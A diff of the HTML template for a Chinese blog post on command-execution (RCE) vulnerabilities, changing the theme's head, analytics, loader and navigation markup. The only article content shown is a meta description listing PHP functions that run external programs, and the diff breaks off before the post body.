@@ -1,450 +1,254 @@
-<!DOCTYPE HTML>
-<html lang="zh-CN">
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  data-theme="dark" >
+  <head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script src="https://www.googletagmanager.com/gtag/js?id=true"></script>
+  <script data-pjax>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+
+    gtag('config', 'true');
+  </script>
+  <!-- End Google Analytics -->
 
 
-<head>
-    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
-    <meta name="keywords" content="命令执行漏洞总结, yyjccc的博客">
-    <meta name="description" content="命令执行漏洞（RCE）相关函数php 常见的调用外部程序的函数
-系统命令执行
+  
 
-system(args)–有回显
-shell_exec(args)–无回显必须输出
-passthru()
-popen(handle,mode)–无回显
-exec">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <meta name="renderer" content="webkit|ie-stand|ie-comp">
-    <meta name="mobile-web-app-capable" content="yes">
-    <meta name="format-detection" content="telephone=no">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta name="referrer" content="no-referrer-when-downgrade">
-    <!-- Global site tag (gtag.js) - Google Analytics -->
+  
+  <script async src="https://hm.baidu.com/hm.js?true"></script>
+  <script data-pjax>
+    var _hmt = _hmt || [];
+    _hmt.push(["_trackPageview", location.pathname]);
+  </script>
 
 
-    <title>命令执行漏洞总结 | yyjccc的博客</title>
-    <link rel="icon" type="image/png" href="/favicon.png">
+  
+  <script>window.icon_font = '4552607_tq6stt6tcg';window.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.outdate = {"enable":true,"daysAgo":180,"message":"本文最后更新于 {time}，请注意文中内容可能已经发生变化。"};</script>
+  
+  
+  <title>
+    命令执行漏洞总结 |
     
-    <style>
-        body{
-            background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
-            background-repeat:no-repeat;
-            background-size: 100% 100%;
-            background-attachment:fixed;
-        }
-    </style>
+    yyjccc的博客
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CUbuntu%20Mono:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CUbuntu%20Mono:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_tq6stt6tcg.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
 
+  
+  <meta name="description" content="命令执行漏洞（RCE）相关函数php 常见的调用外部程序的函数 系统命令执行  system(args)–有回显 shell_exec(args)–无回显必须输出 passthru() popen(handle,mode)–无回显 exec(args)–回显最后一行，必须加echo输出 proc_open() &#96;(反单引号)  在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 she">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令执行漏洞总结">
+<meta property="og:url" content="https://yyjccc.github.io/2023/08/05/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="yyjccc的博客">
+<meta property="og:description" content="命令执行漏洞（RCE）相关函数php 常见的调用外部程序的函数 系统命令执行  system(args)–有回显 shell_exec(args)–无回显必须输出 passthru() popen(handle,mode)–无回显 exec(args)–回显最后一行，必须加echo输出 proc_open() &#96;(反单引号)  在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 she">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=NThjZjVhNjA3NWI1NmY1MjI1NzI2ZDcwZTE2NGQ4YTlfdnEydWQ0VDBWMFU4Z2dLMW1XVGhEUHhKZkQwV1M2VkNfVG9rZW46WmZiemJLdWZYb3lZZEp4cEVKbmNzZVhJbmViXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA">
+<meta property="og:image" content="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YWU5MjU2NWQ2MWJmYjU3Zjk5MGY3MTY2Y2Q4YmZiYzZfUENkN3pEbm5MMzU2b0hQWk9NVDhENnlHVlo0R3J3alRfVG9rZW46RUYzd2JmRWt6b2JkRXl4NkFlRGNVQ0tpbmxiXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA">
+<meta property="og:image" content="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=M2Y2OTE1NzVjMzBkZGZiZGY1MzZmODY0ODk4OWNjMWFfOXQ1SnRDZ1NqTVJSaWZvOEJMZDNDYmxJSlV0SFlHNTFfVG9rZW46QkpCYmJReDR4bzZVMUd4ZDBtTmNFTEMxbkZnXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA">
+<meta property="og:image" content="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YjcwZmViOTQ5NjZlYzZkZDdlMjMyNjIyOGQ2M2VjODhfNmFYY2VGZU1oRXFNZXVYMXh2dVRxWGlWQXVybTR1dGxfVG9rZW46VkJOQ2I1UmVPb0o1QU54cE9xV2NUcjB5bjFiXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA">
+<meta property="og:image" content="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MmY0Yzk0MjA1MWU0MDlhNWMyODAwMTBkZDIyMzEyZTZfTHU0emMxbVBkQXJjMGo4WVhGWVoxOVQ0MDRMZmpKbVpfVG9rZW46RnBjTGJhYkM5bzZkU2p4NndQcWNOOHpmbmFnXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA">
+<meta property="og:image" content="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ODYyMDRkNmUzOWFjYjMzYzdkOTlmNDJiNWZmZGI1MmNfcjdPTTJNaGRQUnMzQVk5dGF5QlVpN2ZHM1lYN2NlcjJfVG9rZW46RE1XRGJ6N1lFb3Bycnd4OUJtQmNpSFhybmtZXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA">
+<meta property="og:image" content="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YTcyMjlhMDI4YmE1Y2FjNGJhZjlmODNmZTNiZGJhZmZfaFhtY2FKVGx6TzBqVldjc3JMMzFpN3dYdkRsUWhrYW1fVG9rZW46T2ViS2JJVTUyb2l6THl4Vk81WGNpVkFBbnhmXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA">
+<meta property="og:image" content="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDE3NmU2OTdkM2Y4ODVlMDYwZDFlOTk0YTc3NmRmNzlfUEJkRDBXM1VEdWxpNnhyaHVPMnlZN01xQVlad2ZZVTFfVG9rZW46SldnZ2JWcm1Qb0YzYjl4d3ZHMWNQSlZWbjNlXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA">
+<meta property="og:image" content="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=NTE2NmNjMmNkMDJmODQ5ODZmN2RmYzQyMzczYzFlMDJfM0xMWHg3OE5xVnVLVmVzc0hNOTNTRlB0WWh4R1UyUDVfVG9rZW46SU11QWJUNnNKbzNiMGV4c1djMWN5bGdUbmJkXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA">
+<meta property="og:image" content="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YmM0Yzc3YWEzYTJlOTZlYjE0ZDAwMmFiMTk5ZjFjMjVfNk5pVnRYRzlpTjFvQWFJVG1vY3l2TUxKY0UyQ1hMdUdfVG9rZW46QnhKdWJQM3pxbzZpYWZ4amxSRWNpOEMwbk9oXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA">
+<meta property="og:image" content="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=N2Q3MWE2ZDBhYWQ0YTY1NGY2OWIyMGFiYWM5Nzk5MTZfaFFMRmw1NGZBVVNoVzBqcFk3ZkREVXdzWHY1TFQ1dnFfVG9rZW46VTNUTmJtMm1wb1FlVjF4dGw0cWNQNWx3bndoXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA">
+<meta property="og:image" content="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjZhNmMwNTczNTBjYzg1MzYwZmJiMWE4MjJiZWNjNjVfY3dMU2RKR241cFhIZnJpTFZ1YTBQdWdCTmNRcnFVZVdfVG9rZW46UzV5aWJHekdzb21GYkx4RW1qc2MybTBDbkN1XzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA">
+<meta property="og:image" content="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDUxM2YxNjdiNTc4YjM2MTc3OWUxMDY2YjMxYmQ5NWZfUU1jdjRlVzRlVktzNnFuVmNEYktiOHRkTk1tRGp0Yk9fVG9rZW46Tmw3Z2JwaFVGb2FCYjZ4NHFwcGNJcjV6bmIwXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA">
+<meta property="og:image" content="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjVkZmE4MmRmMWM2MTI0NWFjZTU5ZjMyODdkZjljNTVfUkFGQmZJZTJWaDJZNW1JbksyWHpybzNnYlF0WEpnNVRfVG9rZW46SWdQbmJOTzZrbzcyZXB4dlJVU2NKM2d6bm5nXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA">
+<meta property="og:image" content="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YzE1NDM3ZGZiNDRkYThjZGQ3MzBmNTNiMGFiOTJhMTJfc2FuaTliR0hhNG1YY3dIQ1plTDE4cU5mcWdZZGswSWdfVG9rZW46SHJEQWJWYWdPbzNRclB4dXhBQmNSb2h2bnRmXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA">
+<meta property="og:image" content="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YmU2NDExYzg1OWQ4NTBlYzcyMGVmOGQzYmVmMmMwOTlfbkNuVEc4RFRhdGViTHAyV3lGMWtQV04zOWlVTkFidWpfVG9rZW46WlA2eGJET2VlbzR3RzB4T3NTNWNQcWIzbnZiXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA">
+<meta property="og:image" content="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YzBjNWFiZTUxOWRjNTc1ZmY4MWQ0ZjE5NjdkN2NmY2VfZGlrQzFkVFZ2Ykw3Y0FxWUxLS0VNTmNNbHQyTEVDVzdfVG9rZW46Ulg5NWJsaHFvb1hLOWF4bXQ1WWNGZE5BblFlXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA">
+<meta property="og:image" content="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MDAzMjYwNTQ3OWUyOWRjNzRlZjUyNDc4YThkZGM4NmRfMnd3UFZESXczWVBVT05FbW9RYmxKcFAyUDdBSkRJaGNfVG9rZW46QUtYUmJnRVNNb09VSm14SGI3cGNjYjBJblFmXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA">
+<meta property="og:image" content="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=OTc0NjY0MzQzYzc3MWY5NmM0YzA1MWI0NWM0MjdkMmJfM2NDekp1RnpVN3p0RWZUd2sxRU5rQlB0NDJ1TFVWM1NfVG9rZW46VHM5eGJid3VGbzdhY1N4aDc5M2NBQmdHblhjXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA">
+<meta property="og:image" content="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MDFiMzQyMzcwMjUzODhlZTQ2YzE4ODdjZTcyZDQ1NzBfazhHb1paS0pwcWdyekd3YW5CTDByWlUwZFFiaXBsbnZfVG9rZW46WFJLWWJTQ2xjb2ZXeWx4d09CQmNEZlZNblYxXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA">
+<meta property="og:image" content="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTI1NjQxZjkzM2U2MWYzZGYyMTdlNWY3MGQ3MjQzYzFfV2lUS1VPVVkzZzl0OUlLN2I2YlFQaUlxVklkOW80WmRfVG9rZW46UUh6bGIyUUdGb0Z4TnF4QVduMWMwZVh0blZnXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA">
+<meta property="og:image" content="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MWVkOWYzMWM5ZDE0NzBhYzRhYjdmZDM3OWE5MDM3ZTRfcVJ5R0t2RUtoZ3Z6Q2dJZzRYSWdjU0czb2RsVUFJdU9fVG9rZW46VVhmN2JJUHpmb0lJc3F4WEV0NWNSSUh2bkZnXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA">
+<meta property="article:published_time" content="2023-08-05T15:34:41.951Z">
+<meta property="article:modified_time" content="2023-12-10T15:44:56.686Z">
+<meta property="article:author" content="Yyjccc">
+<meta property="article:tag" content="web安全">
+<meta property="article:tag" content="基础漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=NThjZjVhNjA3NWI1NmY1MjI1NzI2ZDcwZTE2NGQ4YTlfdnEydWQ0VDBWMFU4Z2dLMW1XVGhEUHhKZkQwV1M2VkNfVG9rZW46WmZiemJLdWZYb3lZZEp4cEVKbmNzZVhJbmViXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA">
+  
+    <link rel="alternate" href="/atom.xml" title="yyjccc的博客" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
 
-
-    <!-- bg-cover style     -->
-
-
-
-<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
-<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
-<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
-<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
-<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
-<link rel="stylesheet" type="text/css" href="/css/matery.css">
-<link rel="stylesheet" type="text/css" href="/css/my.css">
-<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
-
-
-
-
-    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
-    <link rel="stylesheet" href="/css/post.css">
-
-
-
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+    
+      
+<link rel="stylesheet" href="https://npm.webcache.cn/gitalk/dist/gitalk.css">
 
     
+  
+  
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>
 
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.0.1/dist/aos.css">
 
-
-    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
-
+  
 <meta name="generator" content="Hexo 6.3.0">
-<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-<link rel="alternate" href="/atom.xml" title="yyjccc的博客" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 </head>
 
-
-    <body>
-        <!-- hexo-inject:begin --><!-- hexo-inject:end --><header class="navbar-fixed">
-    <nav id="headNav" class="bg-color nav-transparent">
-        <div id="navContainer" class="nav-wrapper container">
-            <div class="brand-logo">
-                <a href="/" class="waves-effect waves-light">
-                    
-                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
-                    
-                    <span class="logo-span">yyjccc的博客</span>
-                </a>
-            </div>
-            
-
-<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
-<ul class="right nav-menu">
-  
-  <li class="hide-on-med-and-down nav-item">
+  <body>
     
-    <a href="/" class="waves-effect waves-light">
-      
-      <i class="fas fa-home" style="zoom: 0.6;"></i>
-      
-      <span>首页</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/tags" class="waves-effect waves-light">
-      
-      <i class="fas fa-tags" style="zoom: 0.6;"></i>
-      
-      <span>标签</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/categories" class="waves-effect waves-light">
-      
-      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
-      
-      <span>分类</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/archives" class="waves-effect waves-light">
-      
-      <i class="fas fa-archive" style="zoom: 0.6;"></i>
-      
-      <span>归档</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>关于</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/contact" class="waves-effect waves-light">
-      
-      <i class="fas fa-comments" style="zoom: 0.6;"></i>
-      
-      <span>留言板</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/friends" class="waves-effect waves-light">
-      
-      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
-      
-      <span>友情链接</span>
-    </a>
-    
-  </li>
-  
-  <li>
-    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
-      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
-    </a>
-  </li>
-  <li>
-    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
-      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
-    </a>
-  </li>
-</ul>
-
-
-<div id="mobile-nav" class="side-nav sidenav">
-
-    <div class="mobile-head bg-color">
-        
-        <img src="/medias/logo.png" class="logo-img circle responsive-img">
-        
-        <div class="logo-name">yyjccc的博客</div>
-        <div class="logo-desc">
-            
-            Never really desperate, only the lost of the soul.
-            
-        </div>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+          <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff5252" />
+          <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+         M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="#ff5252" />
+        </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
     </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
 
-    <ul class="menu-list mobile-menu-list">
-        
-        <li class="m-nav-item">
-	  
-		<a href="/" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-home"></i>
-			
-			首页
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/tags" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-tags"></i>
-			
-			标签
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/categories" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-bookmark"></i>
-			
-			分类
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/archives" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-archive"></i>
-			
-			归档
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			关于
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/contact" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-comments"></i>
-			
-			留言板
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/friends" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-address-book"></i>
-			
-			友情链接
-		</a>
-          
-        </li>
-        
-        
-        <li><div class="divider"></div></li>
-        <li>
-            <a href="https://github.com/Yyjccc" class="waves-effect waves-light" target="_blank">
-                <i class="fab fa-github-square fa-fw"></i>Fork Me
-            </a>
-        </li>
-        
-    </ul>
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
 </div>
 
 
-        </div>
-
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/">首页</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/archives">归档</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/about">关于</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/friend">友链</a>
+      </span>
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+    
+    
+    
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索"></a>
+    
+  </nav>
+</div>
+<header id="header">
+  
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="命令执行漏洞总结">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
         
-            <style>
-    .nav-transparent .github-corner {
-        display: none !important;
-    }
-
-    .github-corner {
-        position: absolute;
-        z-index: 10;
-        top: 0;
-        right: 0;
-        border: 0;
-        transform: scale(1.1);
-    }
-
-    .github-corner svg {
-        color: #0f9d58;
-        fill: #fff;
-        height: 64px;
-        width: 64px;
-    }
-
-    .github-corner:hover .octo-arm {
-        animation: a 0.56s ease-in-out;
-    }
-
-    .github-corner .octo-arm {
-        animation: none;
-    }
-
-    @keyframes a {
-        0%,
-        to {
-            transform: rotate(0);
-        }
-        20%,
-        60% {
-            transform: rotate(-25deg);
-        }
-        40%,
-        80% {
-            transform: rotate(10deg);
-        }
-    }
-</style>
-
-<a href="https://github.com/Yyjccc" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
-   data-tooltip="Fork Me" data-position="left" data-delay="50">
-    <svg viewBox="0 0 250 250" aria-hidden="true">
-        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
-        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
-              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
-        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
-              fill="currentColor" class="octo-body"></path>
-    </svg>
-</a>
         
-    </nav>
-
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">命令执行漏洞总结</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
 </header>
 
-            
-
-
-
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
-    <div class="container" style="right: 0px;left: 0px;">
-        <div class="row">
-            <div class="col s12 m12 l12">
-                <div class="brand">
-                    <h1 class="description center-align post-title">命令执行漏洞总结</h1>
-                </div>
-            </div>
-        </div>
-    </div>
+        <div id="content">
+          
+          <section id="main"><article id="post-命令执行漏洞总结" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2023/08/05/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2023-08-05T15:34:41.951Z" itemprop="datePublished">2023-08-05</time>
+    <time style="display: none;" id="post-update-time">2023-12-10</time>
+  </a>
 </div>
 
+      
 
-
-
-<main class="post-container content">
-
+    </div>
+    <div class="hr-line"></div>
     
-    <div class="row">
-    <div id="main-content" class="col s12 m12 l9">
-        <!-- 文章内容详情 -->
-<div id="artDetail">
-    <div class="card">
-        <div class="card-content article-info">
-            <div class="row tag-cate">
-                <div class="col s7">
-                    
-                    <div class="article-tag">
-                        
-                            <a href="/tags/web%E5%AE%89%E5%85%A8/">
-                                <span class="chip bg-color">web安全</span>
-                            </a>
-                        
-                            <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">
-                                <span class="chip bg-color">基础漏洞</span>
-                            </a>
-                        
-                    </div>
-                    
-                </div>
-                <div class="col s5 right-align">
-                    
-                </div>
-            </div>
 
-            <div class="post-info">
-                
-                <div class="post-date info-break-policy">
-                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-08-05
-                </div>
-                
-
-                
-
-                
-                <div class="info-break-policy">
-                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4.5k
-                </div>
-                
-
-                
-                <div class="info-break-policy">
